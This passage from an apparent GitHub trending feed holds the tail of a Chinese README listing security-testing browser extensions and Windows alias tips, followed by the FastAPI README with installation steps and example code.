&lt;li&gt;Proxy SwitchyOmega：快速切换代理 &lt;a href=&#34;https://github.com/FelisCatus/SwitchyOmega&#34;&gt;https://github.com/FelisCatus/SwitchyOmega&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Wappalyzer：识别网站技术/框架/语言 &lt;a href=&#34;https://www.wappalyzer.com/&#34;&gt;https://www.wappalyzer.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;EditThisCookie：修改Cookie &lt;a href=&#34;https://www.editthiscookie.com/&#34;&gt;https://www.editthiscookie.com/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;FindSomething：在网页的源代码或js中寻找有用信息 &lt;a href=&#34;https://github.com/ResidualLaugh/FindSomething&#34;&gt;https://github.com/ResidualLaugh/FindSomething&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Disable JavaScript：禁用JavaScript绕过弹窗 &lt;a href=&#34;https://github.com/dpacassi/disable-javascript&#34;&gt;https://github.com/dpacassi/disable-javascript&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Hunter：查找网页暴露邮箱 &lt;a href=&#34;https://hunter.io/chrome&#34;&gt;https://hunter.io/chrome&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Hack Bar：渗透神器No.1 &lt;a href=&#34;https://github.com/0140454/hackbar&#34;&gt;https://github.com/0140454/hackbar&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Xray&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Xray：安全评估工具 &lt;a href=&#34;https://github.com/chaitin/xray&#34;&gt;https://github.com/chaitin/xray&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Zsh&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;oh my zsh：命令行工具集 好用 推荐 &lt;a href=&#34;https://github.com/ohmyzsh/ohmyzsh&#34;&gt;https://github.com/ohmyzsh/ohmyzsh&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;使用姿势&lt;/h2&gt; &#xA;&lt;h3&gt;如何在Windows上使用alias&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;创建alias.bat，文件内容如下。&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code&gt;@echo off&#xA;::Tips&#xA;@DOSKEY httpcode=type &#34;D:\Hack Tools\Tips\http_status_code.md&#34;&#xA;@DOSKEY versions=type &#34;D:\Hack Tools\Tips\versions.md&#34;&#xA;@DOSKEY owasp=type &#34;D:\Hack Tools\Tips\owasp.md&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;注册表打开&lt;code&gt;计算机\HKEY_CURRENT_USER\Software\Microsoft\Command Processor&lt;/code&gt;。&lt;/li&gt; &#xA; &lt;li&gt;创建字符串值&lt;code&gt;autorun&lt;/code&gt;，赋值为alias.bat所在位置，例如&lt;code&gt;D:\Software\alias.bat&lt;/code&gt;。&lt;/li&gt; &#xA; &lt;li&gt;双击alias.bat运行，重启cmd。&lt;/li&gt; &#xA; &lt;li&gt;此时在终端输入httpcode，即可返回文件内容。&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205131147745.png&#34; alt=&#34;image-20220208090022459&#34;&gt;&lt;/p&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;p&gt;解决cmd中文乱码的问题：&lt;/p&gt; &#xA; &lt;ol&gt; &#xA;  &lt;li&gt;注册表打开&lt;code&gt;计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Command Processor&lt;/code&gt;。&lt;/li&gt; &#xA;  &lt;li&gt;创建字符串值&lt;code&gt;autorun&lt;/code&gt;，赋值为&lt;code&gt;chcp 65001&lt;/code&gt;。&lt;/li&gt; &#xA; &lt;/ol&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;h3&gt;如何使用浏览器快速查看markdown文档&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;安装插件&lt;code&gt;Markdown Viewer&lt;/code&gt;。&lt;/li&gt; &#xA; &lt;li&gt;配合Bootstrap可以实现快速部署导航页或文档库。&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191827578.png&#34; alt=&#34;image-20220519182738441&#34;&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>tiangolo/fastapi</title>
    <updated>2022-06-02T01:32:44Z</updated>
    <id>tag:github.com,2022-06-02:/tiangolo/fastapi</id>
    <link href="https://github.com/tiangolo/fastapi" rel="alternate"></link>
    <summary type="html">&lt;p&gt;FastAPI framework, high performance, easy to learn, fast to code, ready for production&lt;/p&gt;&lt;hr&gt;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://fastapi.tiangolo.com&#34;&gt;&lt;img src=&#34;https://fastapi.tiangolo.com/img/logo-margin/logo-teal.png&#34; alt=&#34;FastAPI&#34;&gt;&lt;/a&gt; &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;em&gt;FastAPI framework, high performance, easy to learn, fast to code, ready for production&lt;/em&gt; &lt;/p&gt; &#xA;&lt;p align=&#34;center&#34;&gt; &lt;a href=&#34;https://github.com/tiangolo/fastapi/actions?query=workflow%3ATest+event%3Apush+branch%3Amaster&#34; target=&#34;_blank&#34;&gt; &lt;img src=&#34;https://github.com/tiangolo/fastapi/workflows/Test/badge.svg?event=push&amp;amp;branch=master&#34; alt=&#34;Test&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://codecov.io/gh/tiangolo/fastapi&#34; target=&#34;_blank&#34;&gt; &lt;img src=&#34;https://img.shields.io/codecov/c/github/tiangolo/fastapi?color=%2334D058&#34; alt=&#34;Coverage&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://pypi.org/project/fastapi&#34; target=&#34;_blank&#34;&gt; &lt;img src=&#34;https://img.shields.io/pypi/v/fastapi?color=%2334D058&amp;amp;label=pypi%20package&#34; alt=&#34;Package version&#34;&gt; &lt;/a&gt; &lt;a href=&#34;https://pypi.org/project/fastapi&#34; target=&#34;_blank&#34;&gt; &lt;img src=&#34;https://img.shields.io/pypi/pyversions/fastapi.svg?color=%2334D058&#34; alt=&#34;Supported Python versions&#34;&gt; &lt;/a&gt; &lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;strong&gt;Documentation&lt;/strong&gt;: &lt;a href=&#34;https://fastapi.tiangolo.com&#34; target=&#34;_blank&#34;&gt;&lt;/a&gt;&lt;a href=&#34;https://fastapi.tiangolo.com&#34;&gt;https://fastapi.tiangolo.com&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Source Code&lt;/strong&gt;: &lt;a href=&#34;https://github.com/tiangolo/fastapi&#34; target=&#34;_blank&#34;&gt;&lt;/a&gt;&lt;a href=&#34;https://github.com/tiangolo/fastapi&#34;&gt;https://github.com/tiangolo/fastapi&lt;/a&gt;&lt;/p&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;FastAPI is a modern, fast (high-performance), web framework for building APIs with Python 3.6+ based on standard Python type hints.&lt;/p&gt; &#xA;&lt;p&gt;The key features are:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Fast&lt;/strong&gt;: Very high performance, on par with &lt;strong&gt;NodeJS&lt;/strong&gt; and &lt;strong&gt;Go&lt;/strong&gt; (thanks to Starlette and Pydantic). &lt;a href=&#34;https://raw.githubusercontent.com/tiangolo/fastapi/master/#performance&#34;&gt;One of the fastest Python frameworks available&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Fast to code&lt;/strong&gt;: Increase the speed to develop features by about 200% to 300%. *&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Fewer bugs&lt;/strong&gt;: Reduce about 40% of human (developer) induced errors. *&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Intuitive&lt;/strong&gt;: Great editor support. &lt;abbr title=&#34;also known as auto-complete, autocompletion, IntelliSense&#34;&gt;Completion&lt;/abbr&gt; everywhere. Less time debugging.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Easy&lt;/strong&gt;: Designed to be easy to use and learn. Less time reading docs.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Short&lt;/strong&gt;: Minimize code duplication. Multiple features from each parameter declaration. Fewer bugs.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Robust&lt;/strong&gt;: Get production-ready code. With automatic interactive documentation.&lt;/p&gt; &lt;/li&gt; &#xA; &lt;li&gt; &lt;p&gt;&lt;strong&gt;Standards-based&lt;/strong&gt;: Based on (and fully compatible with) the open standards for APIs: &lt;a href=&#34;https://github.com/OAI/OpenAPI-Specification&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;OpenAPI&lt;/a&gt; (previously known as Swagger) and &lt;a href=&#34;https://json-schema.org/&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;JSON Schema&lt;/a&gt;.&lt;/p&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;small&gt;* estimation based on tests on an internal development team, building production applications.&lt;/small&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Sponsors&lt;/h2&gt; &#xA;&lt;!-- sponsors --&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://bit.ly/2QSouzH&#34; target=&#34;_blank&#34; title=&#34;Jina: build neural search-as-a-service for any kind of data in just minutes.&#34;&gt;&lt;img src=&#34;https://fastapi.tiangolo.com/img/sponsors/jina.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://cryptapi.io/&#34; target=&#34;_blank&#34; title=&#34;CryptAPI: Your easy to use, secure and privacy oriented payment gateway.&#34;&gt;&lt;img src=&#34;https://fastapi.tiangolo.com/img/sponsors/cryptapi.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://classiq.link/n4s&#34; target=&#34;_blank&#34; title=&#34;Join the team building a new SaaS platform that will change the computing world&#34;&gt;&lt;img src=&#34;https://fastapi.tiangolo.com/img/sponsors/classiq.png&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.dropbase.io/careers&#34; target=&#34;_blank&#34; title=&#34;Dropbase - seamlessly collect, clean, and centralize data.&#34;&gt;&lt;img src=&#34;https://fastapi.tiangolo.com/img/sponsors/dropbase.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.deta.sh/?ref=fastapi&#34; target=&#34;_blank&#34; title=&#34;The launchpad for all your (team&#39;s) ideas&#34;&gt;&lt;img src=&#34;https://fastapi.tiangolo.com/img/sponsors/deta.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.investsuite.com/jobs&#34; target=&#34;_blank&#34; title=&#34;Wealthtech jobs with FastAPI&#34;&gt;&lt;img src=&#34;https://fastapi.tiangolo.com/img/sponsors/investsuite.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://training.talkpython.fm/fastapi-courses&#34; target=&#34;_blank&#34; title=&#34;FastAPI video courses on demand from people you trust&#34;&gt;&lt;img src=&#34;https://fastapi.tiangolo.com/img/sponsors/talkpython.png&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://testdriven.io/courses/tdd-fastapi/&#34; target=&#34;_blank&#34; title=&#34;Learn to build high-quality web apps with best practices&#34;&gt;&lt;img src=&#34;https://fastapi.tiangolo.com/img/sponsors/testdriven.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/deepset-ai/haystack/&#34; target=&#34;_blank&#34; title=&#34;Build powerful search from composable, open source building blocks&#34;&gt;&lt;img src=&#34;https://fastapi.tiangolo.com/img/sponsors/haystack-fastapi.svg?sanitize=true&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.udemy.com/course/fastapi-rest/&#34; target=&#34;_blank&#34; title=&#34;Learn FastAPI by building a complete project. Extend your knowledge on advanced web development-AWS, Payments, Emails.&#34;&gt;&lt;img src=&#34;https://fastapi.tiangolo.com/img/sponsors/ines-course.jpg&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://careers.budget-insight.com/&#34; target=&#34;_blank&#34; title=&#34;Budget Insight is hiring!&#34;&gt;&lt;img src=&#34;https://fastapi.tiangolo.com/img/sponsors/budget-insight.svg?sanitize=true&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;!-- /sponsors --&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://fastapi.tiangolo.com/fastapi-people/#sponsors&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;Other sponsors&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Opinions&lt;/h2&gt; &#xA;&lt;p&gt;&#34;&lt;em&gt;[...] I&#39;m using &lt;strong&gt;FastAPI&lt;/strong&gt; a ton these days. [...] I&#39;m actually planning to use it for all of my team&#39;s &lt;strong&gt;ML services at Microsoft&lt;/strong&gt;. Some of them are getting integrated into the core &lt;strong&gt;Windows&lt;/strong&gt; product and some &lt;strong&gt;Office&lt;/strong&gt; products.&lt;/em&gt;&#34;&lt;/p&gt; &#xA;&lt;div style=&#34;text-align: right; margin-right: 10%;&#34;&gt;&#xA; Kabir Khan - &#xA; &lt;strong&gt;Microsoft&lt;/strong&gt; &#xA; &lt;a href=&#34;https://github.com/tiangolo/fastapi/pull/26&#34; target=&#34;_blank&#34;&gt;&lt;small&gt;(ref)&lt;/small&gt;&lt;/a&gt;&#xA;&lt;/div&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&#34;&lt;em&gt;We adopted the &lt;strong&gt;FastAPI&lt;/strong&gt; library to spawn a &lt;strong&gt;REST&lt;/strong&gt; server that can be queried to obtain &lt;strong&gt;predictions&lt;/strong&gt;. [for Ludwig]&lt;/em&gt;&#34;&lt;/p&gt; &#xA;&lt;div style=&#34;text-align: right; margin-right: 10%;&#34;&gt;&#xA; Piero Molino, Yaroslav Dudin, and Sai Sumanth Miryala - &#xA; &lt;strong&gt;Uber&lt;/strong&gt; &#xA; &lt;a href=&#34;https://eng.uber.com/ludwig-v0-2/&#34; target=&#34;_blank&#34;&gt;&lt;small&gt;(ref)&lt;/small&gt;&lt;/a&gt;&#xA;&lt;/div&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&#34;&lt;em&gt;&lt;strong&gt;Netflix&lt;/strong&gt; is pleased to announce the open-source release of our &lt;strong&gt;crisis management&lt;/strong&gt; orchestration framework: &lt;strong&gt;Dispatch&lt;/strong&gt;! [built with &lt;strong&gt;FastAPI&lt;/strong&gt;]&lt;/em&gt;&#34;&lt;/p&gt; &#xA;&lt;div style=&#34;text-align: right; margin-right: 10%;&#34;&gt;&#xA; Kevin Glisson, Marc Vilanova, Forest Monsen - &#xA; &lt;strong&gt;Netflix&lt;/strong&gt; &#xA; &lt;a href=&#34;https://netflixtechblog.com/introducing-dispatch-da4b8a2a8072&#34; target=&#34;_blank&#34;&gt;&lt;small&gt;(ref)&lt;/small&gt;&lt;/a&gt;&#xA;&lt;/div&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&#34;&lt;em&gt;I’m over the moon excited about &lt;strong&gt;FastAPI&lt;/strong&gt;. It’s so fun!&lt;/em&gt;&#34;&lt;/p&gt; &#xA;&lt;div style=&#34;text-align: right; margin-right: 10%;&#34;&gt;&#xA; Brian Okken - &#xA; &lt;strong&gt;&lt;a href=&#34;https://pythonbytes.fm/episodes/show/123/time-to-right-the-py-wrongs?time_in_sec=855&#34; target=&#34;_blank&#34;&gt;Python Bytes&lt;/a&gt; podcast host&lt;/strong&gt; &#xA; &lt;a href=&#34;https://twitter.com/brianokken/status/1112220079972728832&#34; target=&#34;_blank&#34;&gt;&lt;small&gt;(ref)&lt;/small&gt;&lt;/a&gt;&#xA;&lt;/div&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&#34;&lt;em&gt;Honestly, what you&#39;ve built looks super solid and polished. In many ways, it&#39;s what I wanted &lt;strong&gt;Hug&lt;/strong&gt; to be - it&#39;s really inspiring to see someone build that.&lt;/em&gt;&#34;&lt;/p&gt; &#xA;&lt;div style=&#34;text-align: right; margin-right: 10%;&#34;&gt;&#xA; Timothy Crosley - &#xA; &lt;strong&gt;&lt;a href=&#34;https://www.hug.rest/&#34; target=&#34;_blank&#34;&gt;Hug&lt;/a&gt; creator&lt;/strong&gt; &#xA; &lt;a href=&#34;https://news.ycombinator.com/item?id=19455465&#34; target=&#34;_blank&#34;&gt;&lt;small&gt;(ref)&lt;/small&gt;&lt;/a&gt;&#xA;&lt;/div&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&#34;&lt;em&gt;If you&#39;re looking to learn one &lt;strong&gt;modern framework&lt;/strong&gt; for building REST APIs, check out &lt;strong&gt;FastAPI&lt;/strong&gt; [...] It&#39;s fast, easy to use and easy to learn [...]&lt;/em&gt;&#34;&lt;/p&gt; &#xA;&lt;p&gt;&#34;&lt;em&gt;We&#39;ve switched over to &lt;strong&gt;FastAPI&lt;/strong&gt; for our &lt;strong&gt;APIs&lt;/strong&gt; [...] I think you&#39;ll like it [...]&lt;/em&gt;&#34;&lt;/p&gt; &#xA;&lt;div style=&#34;text-align: right; margin-right: 10%;&#34;&gt;&#xA; Ines Montani - Matthew Honnibal - &#xA; &lt;strong&gt;&lt;a href=&#34;https://explosion.ai&#34; target=&#34;_blank&#34;&gt;Explosion AI&lt;/a&gt; founders - &lt;a href=&#34;https://spacy.io&#34; target=&#34;_blank&#34;&gt;spaCy&lt;/a&gt; creators&lt;/strong&gt; &#xA; &lt;a href=&#34;https://twitter.com/_inesmontani/status/1144173225322143744&#34; target=&#34;_blank&#34;&gt;&lt;small&gt;(ref)&lt;/small&gt;&lt;/a&gt; - &#xA; &lt;a href=&#34;https://twitter.com/honnibal/status/1144031421859655680&#34; target=&#34;_blank&#34;&gt;&lt;small&gt;(ref)&lt;/small&gt;&lt;/a&gt;&#xA;&lt;/div&gt; &#xA;&lt;hr&gt; &#xA;&lt;h2&gt;&lt;strong&gt;Typer&lt;/strong&gt;, the FastAPI of CLIs&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://typer.tiangolo.com&#34; target=&#34;_blank&#34;&gt;&lt;img src=&#34;https://typer.tiangolo.com/img/logo-margin/logo-margin-vector.svg?sanitize=true&#34; style=&#34;width: 20%;&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;If you are building a &lt;abbr title=&#34;Command Line Interface&#34;&gt;CLI&lt;/abbr&gt; app to be used in the terminal instead of a web API, check out &lt;a href=&#34;https://typer.tiangolo.com/&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;&lt;strong&gt;Typer&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;Typer&lt;/strong&gt; is FastAPI&#39;s little sibling. And it&#39;s intended to be the &lt;strong&gt;FastAPI of CLIs&lt;/strong&gt;. ⌨️ 🚀&lt;/p&gt; &#xA;&lt;h2&gt;Requirements&lt;/h2&gt; &#xA;&lt;p&gt;Python 3.6+&lt;/p&gt; &#xA;&lt;p&gt;FastAPI stands on the shoulders of giants:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.starlette.io/&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;Starlette&lt;/a&gt; for the web parts.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://pydantic-docs.helpmanual.io/&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;Pydantic&lt;/a&gt; for the data parts.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Installation&lt;/h2&gt; &#xA;&lt;div class=&#34;termy&#34;&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;$ pip install fastapi&#xA;&#xA;---&amp;gt; 100%&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/div&gt; &#xA;&lt;p&gt;You will also need an ASGI server, for production such as &lt;a href=&#34;https://www.uvicorn.org&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;Uvicorn&lt;/a&gt; or &lt;a href=&#34;https://gitlab.com/pgjones/hypercorn&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;Hypercorn&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;div class=&#34;termy&#34;&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;$ pip install &#34;uvicorn[standard]&#34;&#xA;&#xA;---&amp;gt; 100%&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/div&gt; &#xA;&lt;h2&gt;Example&lt;/h2&gt; &#xA;&lt;h3&gt;Create it&lt;/h3&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Create a file &lt;code&gt;main.py&lt;/code&gt; with:&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;from typing import Union&#xA;&#xA;from fastapi import FastAPI&#xA;&#xA;app = FastAPI()&#xA;&#xA;&#xA;@app.get(&#34;/&#34;)&#xA;def read_root():&#xA;    return {&#34;Hello&#34;: &#34;World&#34;}&#xA;&#xA;&#xA;@app.get(&#34;/items/{item_id}&#34;)&#xA;def read_item(item_id: int, q: Union[str, None] = None):&#xA;    return {&#34;item_id&#34;: item_id, &#34;q&#34;: q}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;details markdown=&#34;1&#34;&gt; &#xA; &lt;summary&gt;Or use &lt;code&gt;async def&lt;/code&gt;...&lt;/summary&gt; &#xA; &lt;p&gt;If your code uses &lt;code&gt;async&lt;/code&gt; / &lt;code&gt;await&lt;/code&gt;, use &lt;code&gt;async def&lt;/code&gt;:&lt;/p&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;from typing import Union&#xA;&#xA;from fastapi import FastAPI&#xA;&#xA;app = FastAPI()&#xA;&#xA;&#xA;@app.get(&#34;/&#34;)&#xA;async def read_root():&#xA;    return {&#34;Hello&#34;: &#34;World&#34;}&#xA;&#xA;&#xA;@app.get(&#34;/items/{item_id}&#34;)&#xA;async def read_item(item_id: int, q: Union[str, None] = None):&#xA;    return {&#34;item_id&#34;: item_id, &#34;q&#34;: q}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;:&lt;/p&gt; &#xA; &lt;p&gt;If you don&#39;t know, check the &lt;em&gt;&#34;In a hurry?&#34;&lt;/em&gt; section about &lt;a href=&#34;https://fastapi.tiangolo.com/async/#in-a-hurry&#34; target=&#34;_blank&#34;&gt;&lt;code&gt;async&lt;/code&gt; and &lt;code&gt;await&lt;/code&gt; in the docs&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;h3&gt;Run it&lt;/h3&gt; &#xA;&lt;p&gt;Run the server with:&lt;/p&gt; &#xA;&lt;div class=&#34;termy&#34;&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;$ uvicorn main:app --reload&#xA;&#xA;INFO:     Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)&#xA;INFO:     Started reloader process [28720]&#xA;INFO:     Started server process [28722]&#xA;INFO:     Waiting for application startup.&#xA;INFO:     Application startup complete.&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;/div&gt; &#xA;&lt;details markdown=&#34;1&#34;&gt; &#xA; &lt;summary&gt;About the command &lt;code&gt;uvicorn main:app --reload&lt;/code&gt;...&lt;/summary&gt; &#xA; &lt;p&gt;The command &lt;code&gt;uvicorn main:app&lt;/code&gt; refers to:&lt;/p&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt;&lt;code&gt;main&lt;/code&gt;: the file &lt;code&gt;main.py&lt;/code&gt; (the Python &#34;module&#34;).&lt;/li&gt; &#xA;  &lt;li&gt;&lt;code&gt;app&lt;/code&gt;: the object created inside of &lt;code&gt;main.py&lt;/code&gt; with the line &lt;code&gt;app = FastAPI()&lt;/code&gt;.&lt;/li&gt; &#xA;  &lt;li&gt;&lt;code&gt;--reload&lt;/code&gt;: make the server restart after code changes. Only do this for development.&lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;h3&gt;Check it&lt;/h3&gt; &#xA;&lt;p&gt;Open your browser at &lt;a href=&#34;http://127.0.0.1:8000/items/5?q=somequery&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;&lt;/a&gt;&lt;a href=&#34;http://127.0.0.1:8000/items/5?q=somequery&#34;&gt;http://127.0.0.1:8000/items/5?q=somequery&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You will see the JSON response as:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-JSON&#34;&gt;{&#34;item_id&#34;: 5, &#34;q&#34;: &#34;somequery&#34;}&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;You already created an API that:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Receives HTTP requests in the &lt;em&gt;paths&lt;/em&gt; &lt;code&gt;/&lt;/code&gt; and &lt;code&gt;/items/{item_id}&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Both &lt;em&gt;paths&lt;/em&gt; take &lt;code&gt;GET&lt;/code&gt; &lt;em&gt;operations&lt;/em&gt; (also known as HTTP &lt;em&gt;methods&lt;/em&gt;).&lt;/li&gt; &#xA; &lt;li&gt;The &lt;em&gt;path&lt;/em&gt; &lt;code&gt;/items/{item_id}&lt;/code&gt; has a &lt;em&gt;path parameter&lt;/em&gt; &lt;code&gt;item_id&lt;/code&gt; that should be an &lt;code&gt;int&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;The &lt;em&gt;path&lt;/em&gt; &lt;code&gt;/items/{item_id}&lt;/code&gt; has an optional &lt;code&gt;str&lt;/code&gt; &lt;em&gt;query parameter&lt;/em&gt; &lt;code&gt;q&lt;/code&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h3&gt;Interactive API docs&lt;/h3&gt; &#xA;&lt;p&gt;Now go to &lt;a href=&#34;http://127.0.0.1:8000/docs&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;&lt;/a&gt;&lt;a href=&#34;http://127.0.0.1:8000/docs&#34;&gt;http://127.0.0.1:8000/docs&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You will see the automatic interactive API documentation (provided by &lt;a href=&#34;https://github.com/swagger-api/swagger-ui&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;Swagger UI&lt;/a&gt;):&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://fastapi.tiangolo.com/img/index/index-01-swagger-ui-simple.png&#34; alt=&#34;Swagger UI&#34;&gt;&lt;/p&gt; &#xA;&lt;h3&gt;Alternative API docs&lt;/h3&gt; &#xA;&lt;p&gt;And now, go to &lt;a href=&#34;http://127.0.0.1:8000/redoc&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;&lt;/a&gt;&lt;a href=&#34;http://127.0.0.1:8000/redoc&#34;&gt;http://127.0.0.1:8000/redoc&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;You will see the alternative automatic documentation (provided by &lt;a href=&#34;https://github.com/Rebilly/ReDoc&#34; class=&#34;external-link&#34; target=&#34;_blank&#34;&gt;ReDoc&lt;/a&gt;):&lt;/p&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://fastapi.tiangolo.com/img/index/index-02-redoc-simple.png&#34; alt=&#34;ReDoc&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;Example upgrade&lt;/h2&gt; &#xA;&lt;p&gt;Now modify the file &lt;code&gt;main.py&lt;/code&gt; to receive a body from a &lt;code&gt;PUT&lt;/code&gt; request.&lt;/p&gt; &#xA;&lt;p&gt;Declare the body using standard Python types, thanks to Pydantic.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-Python&#34;&gt;from typing import Union&#xA;&#xA;from fastapi import FastAPI&#xA;from pydantic import BaseModel&#xA;&#xA;app = FastAPI()&#xA;&#xA;&#xA;class Item(BaseModel):&#xA;    name: str&#xA;    price: float&#xA;    is_offer: Union[bool, None] = None&#xA;&#xA;&#xA;@app.get(&#34;/&#34;)&#xA;def read_root():&#xA;    return {&#34;Hello&#34;: &#34;World&#34;}&#xA;&#xA;&#xA;@app.get(&#34;/items/{item_id}&#34;)&#xA;def read_item(item_id: int, q: Union[str, None] = None):&#xA;    return {&#34;item_id&#34;: item_id, &#34;q&#34;: q}&#xA;&#xA;&#xA;@app.put(&#34;/items/{item_id}&#34;)&#xA;def update_item(item_id: int, item: Item):&#xA;    return {&#34;item_name&#34;: item.name, &#34;item_id&#34;: 